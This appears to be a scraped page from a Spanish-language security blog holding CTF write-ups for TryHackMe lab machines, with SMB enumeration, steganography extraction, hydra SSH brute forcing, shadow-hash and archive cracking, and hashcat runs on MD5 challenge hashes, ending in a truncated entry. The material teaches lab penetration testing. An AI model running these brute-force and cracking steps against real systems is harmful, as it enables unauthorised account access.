10.10.214.121 UBUNTU \u0026lt;00\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Workstation Service UBUNTU \u0026lt;03\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Messenger Service UBUNTU \u0026lt;20\u0026gt; - B \u0026lt;ACTIVE\u0026gt; File Server Service ..__MSBROWSE__. \u0026lt;01\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Master Browser WORKGROUP \u0026lt;00\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Domain/Workgroup Name WORKGROUP \u0026lt;1d\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Master Browser WORKGROUP \u0026lt;1e\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Browser Service Elections MAC Address = 00-00-00-00-00-00 [... snip ...] ============================================ | Getting domain SID for 10.10.214.121 | ============================================ Domain Name: WORKGROUP Domain Sid: (NULL SID) [+] Can't determine if host is part of domain or part of a workgroup ======================================= | OS information on 10.10.214.121 | ======================================= [+] Got OS info for 10.10.214.121 from smbclient: [+] Got OS info for 10.10.214.121 from srvinfo: UBUNTU Wk Sv PrQ Unx NT SNT Samba 4.7.6-Ubuntu platform_id :\t500 os version :\t6.1 server type :\t0x809a03 ============================== | Users on 10.10.214.121 | ============================== index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: samba\tName: Desc: user:[samba] rid:[0x3e8] ========================================== | Share Enumeration on 10.10.214.121 | ========================================== Sharename Type Comment --------- ---- ------- Anonymous Disk Anonymous File Server Share IPC$ IPC IPC Service (Samba 4.7.6-Ubuntu) SMB1 disabled -- no workgroup available [+] Attempting to map shares on 10.10.214.121 //10.10.214.121/Anonymous\tMapping: OK, Listing: OK //10.10.214.121/IPC$\t[E] Can't understand response: NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\* [... snip ...] [... snip ...] ======================================================================== | Users on 10.10.214.121 via RID cycling (RIDS: 500-550,1000-1050) | ======================================================================== [I] Found new SID: S-1-22-1 [I] Found new SID: S-1-5-21-3394966362-3970299913-3211979797 [I] Found new SID: S-1-5-32 [+] Enumerating users using SID S-1-5-32 and logon username '', password '' [... snip ...] S-1-5-32-544 BUILTIN\\Administrators (Local Group) S-1-5-32-545 BUILTIN\\Users (Local Group) S-1-5-32-546 BUILTIN\\Guests (Local Group) S-1-5-32-547 BUILTIN\\Power Users (Local Group) S-1-5-32-548 BUILTIN\\Account Operators (Local Group) S-1-5-32-549 BUILTIN\\Server Operators (Local Group) S-1-5-32-550 BUILTIN\\Print Operators (Local Group) [... snip ...] [+] Enumerating users using SID S-1-22-1 and logon username '', password '' S-1-22-1-1001 Unix User\\johan (Local User) S-1-22-1-1002 Unix User\\lily (Local User) [+] Enumerating users using SID S-1-5-21-3394966362-3970299913-3211979797 and logon username '', password '' S-1-5-21-3394966362-3970299913-3211979797-500 *unknown*\\*unknown* (8) S-1-5-21-3394966362-3970299913-3211979797-501 UBUNTU\\nobody (Local User) [... snip ...] S-1-5-21-3394966362-3970299913-3211979797-513 UBUNTU\\None (Domain Group) [... snip ...] S-1-5-21-3394966362-3970299913-3211979797-1000 UBUNTU\\samba (Local User) [... snip ...] ============================================== | Getting printer info for 10.10.214.121 | ============================================== No printers returned. enum4linux complete on Fri Feb 21 18:47:43 2020 Nos logeamos en el SHARENAME Anonymous:\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@aoiri:~# smbclient \\\\\\\\10.10.214.121\\\\Anonymous Enter WORKGROUP\\root\u0026#39;s password: Anonymous login successful Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sun Feb 9 18:22:51 2020 .. D 0 Sun Feb 9 11:48:18 2020 journal.txt N 3470998 Sun Feb 9 18:20:53 2020 in 10253588 blocks of size 1024. 5083492 blocks available smb: \\\u0026gt; get journal.txt getting file \\journal.txt of size 3470998 as journal.txt (334.1 KiloBytes/sec) (average 334.1 KiloBytes/sec) smb: \\\u0026gt;   El archivo journal.txt contiene una cadena base64 decodificamos el archivo y vemos que el header del archivo pertenece a una imagen PNG:\n1 2 3 4 5 6 7 8 9 10 11  root@aoiri:~/tryhackme/cherryblossom# xxd file|head 00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR 00000010: 0000 0500 0000 0355 0802 0000 00a8 15c4 .......U........ 00000020: de00 0100 0049 4441 5478 da24 fd57 b0ee .....IDATx.$.W.. 00000030: 5b76 dd87 adbc fef1 cbfb db39 9d1c 6ece [v.........9..n. 00000040: dd7d 3ba2 9be8 6e34 0812 4c82 400b 2265 .};...n4..L.@.\u0026#34;e 00000050: 9669 5145 3d58 65ca 2597 5d96 4359 2e27 .iQE=Xe.%.].CY.\u0026#39; 00000060: 49a4 5c76 5952 1545 1206 099a 8009 a0d1 I.\\vYR.E........ 00000070: 4027 74ee 7bfb e670 ce3d 619f 9df7 fef2 @\u0026#39;t.{..p.=a..... 00000080: f7cf 2b2f 3ff4 e378 99cf a3c6 fccd 39e0 ..+/?..x......9. 00000090: eeb5 bb0e 3804 8183 0079 e8a0 471e 5964 ....8....y..G.Yd   Cambiamos el archivo a .PNG y la imagen parece no tener nada:\nDespues de intentar con una gran cantidad de herramientas de esteganografia finalmente con stegpy logramos extraer un archivo:\n1 2 3 4 5  root@872e41903b6a:/data# stegpy file.png File _journal.zip succesfully extracted from file.png root@872e41903b6a:/data# file _journal.zip _journal.zip: JPEG image data root@872e41903b6a:/data#   Vemos que el archivo esta con extension zip pero los headers de este son en JPGE, editamos el archivo con los \u0026ldquo;magic numbers\u0026rdquo; de un archivo ZIP.\n1 2 3 4 5  ➜ ctf unzip journal_dat.zip Archive: journal_dat.zip [journal_dat.zip] Journal.ctz password: skipping: Journal.ctz incorrect password ➜ ctf   El archivo esta protegido con contraseña utilizamos fcrackzip para encontrar la contraseña del archivo:\n1 2 3  ➜ ctf fcrackzip -D -u -p /home/sckull/tools/rockyou.txt journal_dat.zip PASSWORD FOUND!!!!: pw == s[... snip ...]r ➜ ctf   Extraemos un archivo ctz, utilizamos 7zjohn para obtener el hash para poder crackearlo con john:\n1  ➜ ctf perl 7zjohn.pl Journal.ctz \u0026gt; hash.txt   Utilizamos john y rockyou para obtener la contraseña:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  root@aoiri:~/tryhackme/cherryblossom# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (7z, 7-Zip [SHA256 256/256 AVX2 8x AES]) Cost 1 (iteration count) is 524288 for all loaded hashes Cost 2 (padding size) is 5 for all loaded hashes Cost 3 (compression type) is 2 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:01:45 0.02% (ETA: 2020-02-29 18:28) 0g/s 26.33p/s 26.33c/s 26.33C/s puppy1..victoria1 t[... snip ...]y (Journal.ctz) 1g 0:00:03:40 DONE (2020-02-21 23:29) 0.004525g/s 25.34p/s 25.34c/s 25.34C/s brownsugar..inferno Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed root@aoiri:~/tryhackme/cherryblossom#   Extraemos el archivo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ➜ tmp 7z e Journal.ctz 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 70434 bytes (69 KiB) Extracting archive: Journal.ctz -- Path = Journal.ctz Type = 7z Physical Size = 70434 Headers Size = 146 Method = LZMA2:16 7zAES Solid = - Blocks = 1 Enter password (will not be echoed): Everything is Ok Size: 158136 Compressed: 70434 ➜ tmp ls Journal.ctd Journal.ctz ➜ tmp   Encontramos un archivo CTD, en su interior vemos un \u0026ldquo;diario\u0026rdquo; que pertenece a Johan, en donde explica que esta escribiendo un wordlist super seguro. Utilizamos el wordlist cherry-blossom.list con el usuario Lily junto con hydra y obtenemos la contraseña en el servicio SSH:\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@aoiri:~/tryhackme/cherryblossom# hydra -l lily -P wordlists/cherry-blossom.list ssh://10.10.76.210 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-21 23:44:12 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 9923 login tries (l:1/p:9923), ~621 tries per task [DATA] attacking ssh://10.10.76.210:22/ [STATUS] 102.00 tries/min, 102 tries in 00:01h, 9821 to do in 01:37h, 16 active [STATUS] 112.00 tries/min, 336 tries in 00:03h, 9587 to do in 01:26h, 16 active [22][ssh] host: 10.10.76.210 login: lily password: M[... snip ...]3 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-21 23:51:03 root@aoiri:~/tryhackme/cherryblossom#   Logramos obtener una shell con el usuario lily:\nUSER - Johan Los archivos de backup siempre tienen cosas interesantes, en esta maquina encontramos un backup de las contraseñas de /etc/shadow, utilizamos john para crackear las contraseña de johan.\nUtilizamos el wordlist que encontramos antes:\n1 2 3 4 5 6 7 8 9 10  ➜ john shadow_hashes --wordlist=/home/sckull/vmware/share/ctf/tmp/wordlists/cherry-blossom.list Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64]) Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:12 27% 0g/s 222.5p/s 452.9c/s 452.9C/s $hickory$..$happiness 0g 0:00:00:23 52% 0g/s 225.1p/s 454.5c/s 454.5C/s $3x!4l!f3..$20robyn06$ [... snip ...s] (johan) 1g 0:00:00:36 100% 0.02721g/s 270.0p/s 452.9c/s 452.9C/s #2lovely..#2little Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed ➜   Cambiamos al usuario johan y obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Utilizamos sudo, pero notamos que al ingresar la contraseña, esta, se muestra en pantalla como asteriscos (esto nos recuerda a la maquina SUDO):\nUtilizamos el exploit de CVE-2019-18364 para explotar la vulnerabilidad de buffer overflow que tiene sudo:\nObtenemos una shell con usuario root y nuestra flag root.txt.\n","description":"","id":47,"section":"posts","tags":["linux"],"title":"TryHackMe - CherryBlossom","uri":"https://sckull.github.io/posts/cherryblossom/"},{"content":"Password Cracking es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.\n Informacion de la Maquina    Titulo password cracking     Info crack the password by using different techniques   Puntos 1985   Dificultad Media   Maker F4_U57    Hashcat - Tutorial the basics of cracking password\nBruteforce MD5 En esta serie de retos se utilizará hashcat para poder obtener la flag de cada uno de los retos. La lista de caracteres que se utilizarán para obtener las flags:\n1 2 3 4 5 6 7 8  ?l = abcdefghijklmnopqrstuvwxyz ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d = 0123456789 ?h = 0123456789abcdef ?H = 0123456789ABCDEF ?s = «space»!\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^_`{|}~ ?a = ?l?u?d?s ?b = 0x00 – 0xff   MD5 #1 Reto:\needb694a362f8ab2effbad5e4c8fa095 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 3 -m 0 hash.txt TRY-HACK-ME-?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Brute-Force * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. eedb694a362f8ab2effbad5e4c8fa095:TRY-HACK-ME-[... snip ...] Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: eedb694a362f8ab2effbad5e4c8fa095 Time.Started.....: Tue Feb 18 20:32:56 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:32:56 2020 (0 secs) Guess.Mask.......: TRY-HACK-ME-?d?d?d [15] Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 4765.5 kH/s (0.01ms) @ Accel:1024 Loops:1 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 1000/1000 (100.00%) Rejected.........: 0/1000 (0.00%) Restore.Point....: 0/1000 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: TRY-HACK-ME-123 -\u0026gt; TRY-HACK-ME-573 Hardware.Mon.#1..: Temp: 53c Util: 16% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:32:51 2020 Stopped: Tue Feb 18 20:32:57 2020 sckull@uplifted:~/tools/hashcat$   MD5 #2 Reto:\needb694a362f8ab2effbad5e4c8fa095 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 3 -m 0 hash.txt TRY-HACK-ME-?d?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Brute-Force * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. 19b489d1c4220946b38d65a7fce24372:TRY-HACK-ME-[... snip ...] Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: 19b489d1c4220946b38d65a7fce24372 Time.Started.....: Tue Feb 18 20:35:18 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:35:18 2020 (0 secs) Guess.Mask.......: TRY-HACK-ME-?d?d?d?d [16] Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 13550.0 kH/s (0.12ms) @ Accel:1024 Loops:1 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 10000/10000 (100.00%) Rejected.........: 0/10000 (0.00%) Restore.Point....: 0/10000 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: TRY-HACK-ME-1234 -\u0026gt; TRY-HACK-ME-5739 Hardware.Mon.#1..: Temp: 55c Util: 15% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:35:15 2020 Stopped: Tue Feb 18 20:35:19 2020 sckull@uplifted:~/tools/hashcat$   MD5 #3 Reto:\n7353d3b528592ecd12139fba62c43287 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 3 -m 0 hash.txt TRY-HACK-ME-?d?d?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Brute-Force * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. 7353d3b528592ecd12139fba62c43287:TRY-HACK-ME-[... snip ...] Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: 7353d3b528592ecd12139fba62c43287 Time.Started.....: Tue Feb 18 20:37:10 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:37:10 2020 (0 secs) Guess.Mask.......: TRY-HACK-ME-?d?d?d?d?d [17] Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 17768.1 kH/s (1.00ms) @ Accel:1024 Loops:1 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 100000/100000 (100.00%) Rejected.........: 0/100000 (0.00%) Restore.Point....: 0/100000 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: TRY-HACK-ME-12345 -\u0026gt; TRY-HACK-ME-57397 Hardware.Mon.#1..: Temp: 56c Util: 63% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:37:07 2020 Stopped: Tue Feb 18 20:37:11 2020 sckull@uplifted:~/tools/hashcat$   Combination (MD5) En esta seccion nos proporcionan tres diccionarios los cuales debemos de combinar segun el reto que se presente, utilizamos combinator de hashcat, el cual utiliza dos diccionarios y los combina (diccionario1diccionario2) para poder crackear un hash.\nMD5 #1 Reto:\na united states city followed by 2 digits (all lowercase) 0f8e6ad80411e27fc85ba1f79153dd8f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 6 -m 0 hash.txt us-city.txt ?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache built: * Filename..: us-city.txt * Passwords.: 2011 * Bytes.....: 19099 * Keyspace..: 201100 * Runtime...: 0 secs The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. 0f8e6ad80411e27fc85ba1f79153dd8f:penn[... snip ...]ia46 Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: 0f8e6ad80411e27fc85ba1f79153dd8f Time.Started.....: Tue Feb 18 20:46:41 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:46:41 2020 (0 secs) Guess.Base.......: File (us-city.txt), Left Side Guess.Mod........: Mask (?d?d) [2], Right Side Guess.Queue.Base.: 1/1 (100.00%) Guess.Queue.Mod..: 1/1 (100.00%) Speed.#1.........: 70748.6 kH/s (0.28ms) @ Accel:128 Loops:50 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 201100/201100 (100.00%) Rejected.........: 0/201100 (0.00%) Restore.Point....: 0/2011 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:50-100 Iteration:0-50 Candidates.#1....: alabama13 -\u0026gt; worland68 Hardware.Mon.#1..: Temp: 53c Util: 62% Core:1176MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:46:36 2020 Stopped: Tue Feb 18 20:46:42 2020 sckull@uplifted:~/tools/hashcat$   MD5 #2 Reto:\na united states city followed by a simple color, followed by 3 digits (all lowercase). fbd527693aceda78b30a978d7d3b9abb Combinator:\n./combinator.bin ../../us-city.txt ../../color.txt \u0026gt; ../../us-city-color.txt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 6 -m 0 hash.txt us-city-color.txt ?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache built: * Filename..: us-city-color.txt * Passwords.: 50275 * Bytes.....: 740916 * Keyspace..: 50275000 * Runtime...: 0 secs The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. fbd527693aceda78b30a978d7d3b9abb:phoe[... snip ...]rple585 Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: fbd527693aceda78b30a978d7d3b9abb Time.Started.....: Tue Feb 18 20:58:05 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:58:05 2020 (0 secs) Guess.Base.......: File (us-city-color.txt), Left Side Guess.Mod........: Mask (?d?d?d) [3], Right Side Guess.Queue.Base.: 1/1 (100.00%) Guess.Queue.Mod..: 1/1 (100.00%) Speed.#1.........: 473.0 MH/s (5.50ms) @ Accel:128 Loops:62 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 24936400/50275000 (49.60%) Rejected.........: 0/24936400 (0.00%) Restore.Point....: 0/50275 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:434-496 Iteration:0-62 Candidates.#1....: alabamared925 -\u0026gt; worlandgrey405 Hardware.Mon.#1..: Temp: 49c Util: 56% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:58:02 2020 Stopped: Tue Feb 18 20:58:06 2020 sckull@uplifted:~/tools/hashcat$   MD5 #3 Reto:\na simple color followed by a country, followed by 4 digits (all lowercase). a4131ef4610be60c0c6a3656b00dd763 Combinator:\n./combinator.bin ../../color.txt ../../country.txt \u0026gt; ../../color-country.txt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 6 -m 0 hash.txt color-country.txt ?d?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache built: * Filename..: color-country.txt * Passwords.: 4775 * Bytes.....: 66846 * Keyspace..: 47750000 * Runtime...: 0 secs The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. a4131ef4610be60c0c6a3656b00dd763:blue[... snip ...]7926 Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: a4131ef4610be60c0c6a3656b00dd763 Time.Started.....: Tue Feb 18 21:00:36 2020 (0 secs) Time.Estimated...: Tue Feb 18 21:00:36 2020 (0 secs) Guess.Base.......: File (color-country.txt), Left Side Guess.Mod........: Mask (?d?d?d?d) [4], Right Side Guess.Queue.Base.: 1/1 (100.00%) Guess.Queue.Mod..: 1/1 (100.00%) Speed.#1.........: 355.7 MH/s (0.63ms) @ Accel:128 Loops:64 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 35755200/47750000 (74.88%) Rejected.........: 0/35755200 (0.00%) Restore.Point....: 0/4775 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:7424-7488 Iteration:0-64 Candidates.#1....: redafghanistan9147 -\u0026gt; greyzimbabwe8479 Hardware.Mon.#1..: Temp: 55c Util: 87% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 21:00:33 2020 Stopped: Tue Feb 18 21:00:37 2020 sckull@uplifted:~/tools/hashcat$   Rainbow Table (NTLM) En esta seccion utilizaremos ophcrack para poder cracker los hashes utilizando un rainbow table. Ophcrack viene incluido en el sistema de Kali Linux, por lo que debemos de descargar unicamente el rainbow table XP special (8GB).\nRetos:\n1 2 3  FF6EDF5C42F0FE57AAD5360A07991BD6:A2F77301E3162DB9213E3DA35D5EA931 1CDEE68485E23D0E1DD9CED345A47D0C:D4F3A9ACC8448BC9EF7C53B3BBBEC9C3 8C7972A6362411C1B0D3662B97EBED58:DAE91036E4B2E7F0B5061956BCE39A3E   Importamos los hashes a ophrack y esperamos el resultado:\n","description":"","id":48,"section":"posts","tags":["challenge"],"title":"TryHackMe - Password Cracking","uri":"https://sckull.github.io/posts/password_cracking_thm/"},{"content":"Json es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Json     OS Linux   Puntos 30   